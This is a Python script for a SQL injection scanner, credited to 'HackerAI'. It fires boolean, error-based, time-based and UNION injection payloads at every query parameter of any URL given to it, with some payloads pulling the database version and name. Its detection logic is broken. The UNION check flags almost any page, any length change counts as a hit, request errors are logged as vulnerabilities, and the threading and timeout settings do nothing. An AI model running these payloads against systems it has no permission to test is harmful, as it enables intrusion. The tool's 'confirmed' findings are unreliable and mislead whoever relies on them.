#!/usr/bin/env python3
"""
SQL Injection Tester - Automated SQLi Detection for Authorized Pentesting
Author: HackerAI
Usage: python3 sqli_tester.py -u "http://target.com/page?id=1"
"""

import requests
import urllib.parse
import sys
import argparse
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode
import warnings
warnings.filterwarnings("ignore")

# ANSI Color codes for hacker aesthetic
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    DIM = '\033[2m'

def print_banner():
    """Print stylish banner"""
    banner = f"""
{Colors.GREEN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║         ╔╗╔═╦═╦╦╦═╦╗╔  ╔═╗╦  ╔═╗╔═╗  ╔═╗╦═╗╦╔═╗╦ ╦        ║
║         ║║║║║║║║║║═╣╠═╝  ║═╦╣  ║╣ ╠═╡  ╠═╣╠╦╝║╠═╝║ ║        ║
║         ╘╝╚═╩═╩═╝╝═╣╚═╝  ║═╩╚═╝╚═╚═╝  ╩ ╩╩╚═╩╚═╚═╩        ║
║                                                           ║
║         [*] Advanced SQL Injection Detection Tool [*]     ║
║         [*] Authorized Penetration Testing Only [*]       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    print(banner)

def print_success(message):
    """Print success message in green"""
    print(f"{Colors.GREEN}✓ {message}{Colors.RESET}")

def print_info(message):
    """Print info message in cyan"""
    print(f"{Colors.CYAN}[*] {message}{Colors.RESET}")

def print_warning(message):
    """Print warning message in yellow"""
    print(f"{Colors.YELLOW}[!] {message}{Colors.RESET}")

def print_vulnerable(message):
    """Print vulnerable message in red"""
    print(f"{Colors.RED}{Colors.BOLD}[CRITICAL] {message}{Colors.RESET}")

def print_divider():
    """Print styled divider"""
    print(f"{Colors.GREEN}{'─' * 70}{Colors.RESET}")

class SQLiTester:
    def __init__(self, base_url, timeout=10, threads=10):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.timeout = timeout
        self.max_threads = threads
        
        # SQLi payloads for detection
        self.boolean_blind_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 1=1--",
            "' OR 1=2--",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--"
        ]
        
        self.error_based_payloads = [
            "' OR '1'='1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
            "1; WAITFOR DELAY '0:0:5'--"
        ]
        
        self.time_based_payloads = [
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND IF(1=1,SLEEP(5),0)--",
            "' OR BENCHMARK(5000000,MD5(1))--"
        ]
        
        self.union_payloads = [
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,@@version,NULL--",
            "' UNION SELECT 1,database(),3--"
        ]
        
        self.detection_patterns = {
            'mysql': [r'mysql', r'MySQL', r'mariadb'],
            'postgres': [r'PostgreSQL', r'pg_'],
            'mssql': [r'Microsoft.*SQL', r'mssql', r'SQL Server'],
            'oracle': [r'Oracle', r'ORA-\d+'],
            'error': [r'syntax.*error', r'warning.*mysql', r'ODBC.*driver', r'sql.*exception']
        }

    def get_original_response(self):
        """Get baseline response"""
        try:
            resp = self.session.get(self.base_url, verify=False)
            return resp.status_code, len(resp.text), resp.text
        except:
            return None, None, None

    def test_parameter(self, param_name, param_value, test_type='boolean'):
        """Test single parameter for SQLi"""
        vulnerabilities = []
        original_status, original_len, original_text = self.get_original_response()
        
        payloads = {
            'boolean': self.boolean_blind_payloads,
            'error': self.error_based_payloads,
            'time': self.time_based_payloads,
            'union': self.union_payloads
        }[test_type]
        
        for idx, payload in enumerate(payloads):
            # Print progress indicator
            progress = f"    {Colors.DIM}[{idx+1}/{len(payloads)}]{Colors.RESET}"
            sys.stdout.write(f"\r{progress} Testing {test_type}...")
            sys.stdout.flush()
            
            test_value = f"{param_value}{payload}" if param_value else payload
            
            # Reconstruct URL with test payload
            parsed = urlparse(self.base_url)
            query_params = parse_qs(parsed.query)
            query_params[param_name] = [test_value]
            new_query = urlencode(query_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            start_time = time.time()
            try:
                resp = self.session.get(test_url, verify=False)
                elapsed = time.time() - start_time
                
                # Analyze response
                status_changed = resp.status_code != original_status
                length_changed = abs(len(resp.text) - original_len) > 100
                time_delay = elapsed > 4  # 4+ seconds indicates time-based blind
                
                # Check for error messages or DBMS fingerprints
                db_evidence = self.detect_dbms(resp.text)
                
                if test_type == 'boolean':
                    if status_changed or length_changed:
                        vulnerabilities.append({
                            'payload': payload,
                            'type': 'boolean_blind',
                            'status_change': status_changed,
                            'length_change': length_changed,
                            'evidence': db_evidence
                        })
                
                elif test_type == 'time' and time_delay:
                    vulnerabilities.append({
                        'payload': payload,
                        'type': 'time_blind',
                        'delay': f"{elapsed:.2f}s",
                        'evidence': db_evidence
                    })
                
                elif test_type == 'error' and (db_evidence or 'error' in resp.text.lower()):
                    vulnerabilities.append({
                        'payload': payload,
                        'type': 'error_based',
                        'evidence': db_evidence or 'Generic error detected'
                    })
                
                elif test_type == 'union' and ('1' in resp.text or '2' in resp.text or '3' in resp.text):
                    vulnerabilities.append({
                        'payload': payload,
                        'type': 'union',
                        'evidence': 'Union data reflected in response'
                    })
                    
            except Exception as e:
                vulnerabilities.append({
                    'payload': payload,
                    'type': 'error',
                    'error': str(e)
                })
            
            time.sleep(0.5)  # Be nice to the server
        
        sys.stdout.write("\r" + " " * 50 + "\r")  # Clear progress line
        return vulnerabilities

    def detect_dbms(self, response_text):
        """Detect DBMS from error messages"""
        text_lower = response_text.lower()
        for dbms, patterns in self.detection_patterns.items():
            for pattern in patterns:
                if re.search(pattern, text_lower, re.IGNORECASE):
                    return f"{dbms} detected"
        return None

    def extract_parameters(self):
        """Extract all parameters from URL"""
        parsed = urlparse(self.base_url)
        params = parse_qs(parsed.query)
        return list(params.keys())

    def test_forms(self):
        """Test forms on the page (basic detection)"""
        try:
            resp = self.session.get(self.base_url, verify=False)
            forms = re.findall(r'<form[^>]*method=["\']?(get|post)["\']?[^>]*>', resp.text, re.I)
            return len(forms) > 0
        except:
            return False

    def run_full_test(self):
        """Run comprehensive SQLi test"""
        print_info(f"Starting scan on: {self.base_url}")
        print_divider()
        
        parsed = urlparse(self.base_url)
        param_dict = parse_qs(parsed.query)
        param_names = list(param_dict.keys())
        
        print_success(f"Found {len(param_names)} parameter(s): {', '.join(param_names)}")
        
        has_forms = self.test_forms()
        if has_forms:
            print_success("Forms detected on page")
        else:
            print_info("No forms detected")
        
        print_divider()
        results = {}
        
        # Test each parameter
        for param in param_names:
            print_info(f"Probing parameter: {Colors.BOLD}{param}{Colors.RESET}")
            results[param] = {}
            
            # Test all payload types
            for test_type in ['boolean', 'error', 'time', 'union']:
                vulns = self.test_parameter(param, param_dict[param][0], test_type)
                if vulns:
                    results[param][test_type] = vulns
                    print_vulnerable(f"  [{test_type.upper()}] VULNERABLE! {len(vulns)} payload(s) confirmed")
                else:
                    print(f"  {Colors.DIM}[ {test_type.upper()} ]{Colors.RESET} No match found")
        
        return results

    def generate_report(self, results):
        """Generate test report with hacker style"""
        print("\n")
        print_divider()
        print(f"{Colors.BOLD}{Colors.RED}╔═══════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.RED}║         SQL INJECTION TEST REPORT                         ║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.RED}╚═══════════════════════════════════════════════════════════╝{Colors.RESET}")
        print_divider()
        
        vulnerable_params = 0
        total_vulns = 0
        
        for param, tests in results.items():
            param_vulns = 0
            for test_type, vulns in tests.items():
                if vulns:
                    param_vulns += 1
                    total_vulns += 1
                    print(f"\n{Colors.RED}{Colors.BOLD}⚠️  CRITICAL VULNERABILITY FOUND{Colors.RESET}")
                    print(f"{Colors.BOLD}   Parameter:{Colors.RESET} {Colors.CYAN}{param}{Colors.RESET}")
                    print(f"{Colors.BOLD}   Type:{Colors.RESET} {Colors.YELLOW}{test_type.upper()}{Colors.RESET}")
                    
                    for idx, vuln in enumerate(vulns[:2], 1):  # Show top 2 payloads
                        payload = vuln['payload']
                        vuln_type = vuln['type']
                        evidence = vuln.get('evidence', 'N/A')
                        
                        print(f"\n   {Colors.GREEN}[Payload {idx}]{Colors.RESET}")
                        print(f"   Payload: {Colors.BOLD}{payload[:60]}...{Colors.RESET}" if len(payload) > 60 else f"   Payload: {Colors.BOLD}{payload}{Colors.RESET}")
                        print(f"   Evidence: {Colors.YELLOW}{evidence}{Colors.RESET}")
            
            if param_vulns > 0:
                vulnerable_params += 1
                print(f"\n   {Colors.RED}{Colors.BOLD}→ Total {param_vulns} vulnerability type(s) confirmed{Colors.RESET}")
                print_divider()
        
        # Summary section
        print(f"\n{Colors.BOLD}{Colors.CYAN}📊 SCAN SUMMARY{Colors.RESET}")
        print_divider()
        
        total_params = len(results)
        
        if vulnerable_params > 0:
            print(f"{Colors.RED}{Colors.BOLD}[CRITICAL]{Colors.RESET} {vulnerable_params}/{total_params} parameters are vulnerable")
            print(f"{Colors.RED}{Colors.BOLD}[CRITICAL]{Colors.RESET} {total_vulns} SQLi payloads confirmed")
            print(f"\n{Colors.RED}{Colors.BOLD}>>> IMMEDIATE ACTION REQUIRED <<<{Colors.RESET}")
        else:
            print(f"{Colors.GREEN}{Colors.BOLD}[SAFE]{Colors.RESET} No SQL injection vulnerabilities detected")
            print(f"{Colors.GREEN}{Colors.BOLD}[PASS]{Colors.RESET} All {total_params} parameter(s) passed tests")
        
        print_divider()
        print(f"{Colors.GREEN}{Colors.BOLD}[✓] Scan completed{Colors.RESET}\n")

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(
        description="SQL Injection Tester - Advanced SQLi Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"{Colors.GREEN}[+] Authorized Penetration Testing Only [-]{Colors.RESET}"
    )
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g. http://example.com/page?id=1)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--proxy', help='Proxy (e.g. http://127.0.0.1:8080)')
    
    args = parser.parse_args()
    
    tester = SQLiTester(args.url, threads=args.threads)
    
    if args.proxy:
        tester.session.proxies = {'http': args.proxy, 'https': args.proxy}
        print_info(f"Using proxy: {args.proxy}")
    
    print()
    results = tester.run_full_test()
    tester.generate_report(results)

if __name__ == "__main__":
    main()
